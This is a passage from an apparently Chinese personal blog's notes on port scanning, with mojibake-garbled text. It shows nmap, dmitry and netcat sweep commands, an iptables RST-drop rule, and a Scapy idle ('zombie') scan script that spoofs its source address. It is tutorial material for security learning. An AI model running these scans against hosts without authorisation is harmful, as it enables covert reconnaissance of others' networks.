<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šiptables -A OUTPUT -p tcp --tcp-flags RST RST -d ç›®æ ‡IPåœ°å€ -j DROP</code></strong></li>
</ul>
<blockquote>
<pre><code>iptablesæ˜¯å·¥ä½œåœ¨åº•å±‚çš„é˜²ç«å¢™ï¼Œåœ¨å†…æ ¸ä¹‹å‰è¿‡æ»¤æ•°æ®
iptables -LæŸ¥çœ‹å½“å‰é˜²ç«å¢™è§„åˆ™</code></pre></blockquote>
<h4 id="6-å…¨è¿æ¥ç«¯å£æ‰«æ"><a href="#6-å…¨è¿æ¥ç«¯å£æ‰«æ" class="headerlink" title="6. å…¨è¿æ¥ç«¯å£æ‰«æ"></a>6. å…¨è¿æ¥ç«¯å£æ‰«æ</h4><ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap IPåœ°å€ -sT -p 80</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap IPåœ°å€ -sT -p 80,21,25</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap IPåœ°å€ -sT -p 1-65535</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap -sT -iL iplist.txt -p 80</code></strong></li>
<li>é»˜è®¤1000ä¸ªå¸¸ç”¨ç«¯å£</li>
</ul>
<h4 id="7-å…¨è¿æ¥ç«¯å£æ‰«æ"><a href="#7-å…¨è¿æ¥ç«¯å£æ‰«æ" class="headerlink" title="7. å…¨è¿æ¥ç«¯å£æ‰«æ"></a>7. å…¨è¿æ¥ç«¯å£æ‰«æ</h4><ul>
<li>dmitry<ul>
<li>åŠŸèƒ½ç®€å•ï¼Œä½†ä½¿ç”¨ç®€ä¾¿</li>
<li>é»˜è®¤150ä¸ªå¸¸ç”¨ç«¯å£</li>
</ul>
</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šdmitry -p IPåœ°å€</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šdmitry -p IPåœ°å€ -o output</code></strong></li>
</ul>
<h4 id="8-å…¨è¿æ¥ç«¯å£æ‰«æ"><a href="#8-å…¨è¿æ¥ç«¯å£æ‰«æ" class="headerlink" title="8. å…¨è¿æ¥ç«¯å£æ‰«æ"></a>8. å…¨è¿æ¥ç«¯å£æ‰«æ</h4><ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnc -nv -wï¼ˆè¿æ¥çš„è¶…æ—¶æ—¶é—´ï¼‰1 -z IPåœ°å€ 1-65535</code></strong>ï¼ˆå€’åºå‘é€ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šfor x in $(seq 20 30);do nc -nv -w 1 -z IPåœ°å€ $x;done | grep open</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šfor x in $(seq 1 254);do nc -nv -w 1 -z 1.1.1.$x 80;done</code></strong></li>
</ul>
<h4 id="9-åƒµå°¸æ‰«æ"><a href="#9-åƒµå°¸æ‰«æ" class="headerlink" title="9. åƒµå°¸æ‰«æ"></a>9. åƒµå°¸æ‰«æ</h4><blockquote>
<pre><code>æ—©æœŸçš„Windowç³»ç»Ÿï¼ŒåŒ…æ‹¬XP,2003,98ç³»ç»Ÿçš„IPIDæ˜¯é€’å¢çš„</code></pre></blockquote>
<ul>
<li>Scapyâ€“zomebie.py<ul>
<li>i=IP()</li>
<li>t=TCP()</li>
<li>rz=(i/t)</li>
<li>rt=(i/t)</li>
<li>rz[IP].dst=â€zombie IPåœ°å€â€</li>
<li>rz[TCP].dport=445</li>
<li>rz[TCP].flags=â€SAâ€</li>
<li>rt[IP].src=â€zombie IPåœ°å€â€</li>
<li>rt[IP].dst=â€target IPåœ°å€â€</li>
<li>rt[TCP].dport=22</li>
<li>rt[TCP].flags=â€Sâ€</li>
<li>az1=sr1(rz) / at=sr1(rt,timeout=1) / az2=sr1(rz)</li>
<li>az1.display() / az2.display()</li>
</ul>
</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./zombie.py</code></strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import logging</span><br><span class="line">logging.getLogger(&quot;scapy,runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">from scapy.all import*</span><br><span class="line"></span><br><span class="line">def ipid(zombie):</span><br><span class="line">    reply1=sr1(IP(dst=zombie)/TCP(flags=&quot;SA&quot;),timeout=2,verbose=0)</span><br><span class="line">    send(IP(dst=zombie)/TCP(flags=&quot;SA&quot;),verbose=0)</span><br><span class="line">    reply2=sr1(IP(dst=zombie)/TCP(flags=&quot;SA&quot;),timeout=2,verbose=0)</span><br><span class="line">    if reply2[IP].id==(reply1[IP].id+2):</span><br><span class="line">      print &quot;IPID sequence is incremental and target appears to be idle.ZOMBIE LOCATED&quot;</span><br><span class="line">      response=raw_input(&quot;DO you want to use this zombie to perfore scan?(Y or N):&quot;)</span><br><span class="line">      if response==&quot;Y&quot;:</span><br><span class="line">        target=raw_input(&quot;Enter the IP Address of the target system:&quot;)</span><br><span class="line">        zombiescant(target,zombie)</span><br><span class="line">    else:</span><br><span class="line">      print &quot;Either the IPID sequence is not incremental or the target is not idle.NOT A GOOD ZOMBIE&quot;</span><br><span class="line"></span><br><span class="line">def zombiescan(target,zombie):</span><br><span class="line">    print &quot;\nScanning target &quot;+target+&quot; with zombie &quot;+zombie</span><br><span class="line">    print &quot;\n-----------Open Ports On Target-------------\n &quot;</span><br><span class="line">    for port in range(1,100):</span><br><span class="line">      try:</span><br><span class="line">        start_val=sr1(IP(dst=zombie)/TCP(flags=&quot;SA&quot;,dport=port),timeout=2,verbose=0)</span><br><span class="line">        send(IP(src=zombie,dst=target)/TCP(flags=&quot;S&quot;,dport=port),verbose=0)</span><br><span class="line">        end_val=sr1(IP(dst=zombie)/TCP(flags=&quot;SA&quot;,dport=port),timeout=2,verbose=0)</span><br><span class="line">        if end_val[IP].id==(start_val[IP].id+2):</span><br><span class="line">          print port</span><br><span class="line">      except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">print &quot;----------------Zombie Scan Suite-----------\n&quot;</span><br><span class="line">print &quot;1 - Identify Zombie Host\n&quot;</span><br><span class="line">print &quot;2 - Perform Zombie Scan\n&quot;</span><br><span class="line">ans=raw_input(&quot;Select an Option (1 or 2):&quot;)</span><br><span class="line">if ans==&quot;1&quot;:</span><br><span class="line">    zombie=raw_input(&quot;Enter IP Address to test IPID sequence&quot;)</span><br><span class="line">    ipid(zombie)</span><br><span class="line">else:</span><br><span class="line">    if ans==&quot;2&quot;:</span><br><span class="line">      zombie=raw_input(&quot;Enter IP Address for zombie sysytem:&quot;)</span><br><span class="line">      target=raw_input(&quot;Enter IP Address for scan target:&quot;)</span><br><span class="line">      zombiescan(target,zombie)</span><br></pre></td></tr></table></figure>

<blockquote>
<pre><code>sr1 å‘åŒ…åªæ”¶ä¸€ä¸ªæ•°æ®åŒ…
send å‘åŒ…ä¸æ”¶æ•°æ®åŒ…</code></pre></blockquote>
<h4 id="10-åƒµå°¸æ‰«æ"><a href="#10-åƒµå°¸æ‰«æ" class="headerlink" title="10. åƒµå°¸æ‰«æ"></a>10. åƒµå°¸æ‰«æ</h4><ul>
<li>å‘ç°åƒµå°¸æœº<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap -p445 IPåœ°å€ --script=ipidseq.nse</code></strong></li>
</ul>
</li>
<li>æ‰«æç›®æ ‡<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap targetçš„IPåœ°å€ -sIï¼ˆæŒ‡å®šzombieï¼‰ zomboeçš„IPåœ°å€ -Pn -p 0-100</code></strong></li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/9/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/11/">Next</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/photo.jpg"
                alt="Tomas" />
            
              <p class="site-author-name" itemprop="name">Tomas</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">125</span>
                  <span class="site-state-item-name">æ—¥å¿—</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">5</span>
                  <span class="site-state-item-name">åˆ†ç±»</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">æ ‡ç­¾</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Tomassky" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:tomassky7@gmail.com" target="_blank" title="Gmailé‚®ç®±">
                      
                        <i class="fa fa-fw fa-envelope"></i>Gmailé‚®ç®±</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ylsword-cheat.top" title="LengSword" target="_blank">LengSword</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://neigeshoufu.github.io/ljy.github.io" title="neigeshoufu" target="_blank">neigeshoufu</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Tomas</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">111.8k</span>
  
</div>


  <div class="powered-by">ç”± <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> å¼ºåŠ›é©±åŠ¨</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">ä¸»é¢˜ &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
